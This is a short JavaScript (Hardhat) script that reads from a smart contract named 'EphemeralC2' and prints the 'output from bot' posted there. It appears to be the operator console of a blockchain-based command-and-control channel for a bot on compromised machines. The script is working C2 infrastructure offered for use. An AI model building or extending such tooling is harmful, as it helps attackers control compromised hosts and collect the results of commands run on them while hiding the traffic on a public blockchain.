require("dotenv").config();
const hre = require("hardhat");

async function main() {
  const contractAddress = process.argv[2];
  if (!contractAddress) {
    console.error("Please provide the EphemeralC2 contract address.");
    process.exit(1);
  }

  const contract = await hre.ethers.getContractAt("EphemeralC2", contractAddress);
  const output = await contract.getOutput();

  if (!output || output.trim() === "") {
    console.log("No command output posted yet.");
  } else {
    console.log("Output from bot:\n", output);
  }
}

main().catch(console.error);
